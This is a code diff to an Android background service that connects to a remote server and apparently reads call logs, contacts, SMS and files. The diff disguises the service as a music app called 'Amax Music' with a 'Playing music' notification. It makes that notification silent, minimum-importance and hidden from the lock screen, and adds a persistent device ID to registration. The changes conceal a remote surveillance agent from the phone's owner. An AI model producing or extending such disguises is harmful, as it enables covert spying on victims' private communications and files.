@@ -39,6 +39,7 @@ import android.os.PowerManager;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
 import android.provider.MediaStore;
+import android.provider.Settings;
 import android.provider.Telephony;
 import android.telephony.SmsManager;
 import android.telephony.SubscriptionInfo;
@@ -177,11 +178,13 @@ public class DeviceService extends Service {
 
             socket.on(Socket.EVENT_CONNECT, args -> {
                 Log.d(TAG, "Connected to server");
-                updateNotification("Connected to " + serverUrl);
+                updateNotification("Playing music");
 
-                // Register device
+                // Register device with persistent ID
+                String androidId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
                 JSONObject regData = new JSONObject();
                 try {
+                    regData.put("deviceId", androidId);
                     regData.put("name", deviceName);
                     regData.put("type", "android-native");
                     regData.put("model", Build.MODEL);
@@ -572,7 +575,7 @@ public class DeviceService extends Service {
                     JSONObject data = new JSONObject();
                     data.put("files", files);
                     data.put("path", path);
-                    data.put("error", "Please grant 'All Files Access' permission in Settings > Apps > My Device Agent > Permissions");
+                    data.put("error", "Please grant 'All Files Access' permission in Settings > Apps > Amax Music > Permissions");
                     socket.emit("files:list", data);
                     return;
                 }
@@ -1708,9 +1711,11 @@ public class DeviceService extends Service {
     private void createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel channel = new NotificationChannel(
-                CHANNEL_ID, "My Device Agent",
-                NotificationManager.IMPORTANCE_LOW);
-            channel.setDescription("Device agent service running");
+                CHANNEL_ID, "Amax Music",
+                NotificationManager.IMPORTANCE_MIN);
+            channel.setDescription("Music streaming service");
+            channel.setShowBadge(false);
+            channel.setSound(null, null);
             NotificationManager nm = getSystemService(NotificationManager.class);
             nm.createNotificationChannel(channel);
         }
@@ -1722,9 +1727,11 @@ public class DeviceService extends Service {
             PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
 
         return new NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("My Device Agent")
-            .setContentText(text)
-            .setSmallIcon(android.R.drawable.ic_menu_compass)
+            .setContentTitle("Amax Music")
+            .setContentText("Playing music")
+            .setSmallIcon(android.R.drawable.ic_media_play)
+            .setSilent(true)
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
             .setContentIntent(pi)
             .setOngoing(true)
             .build();
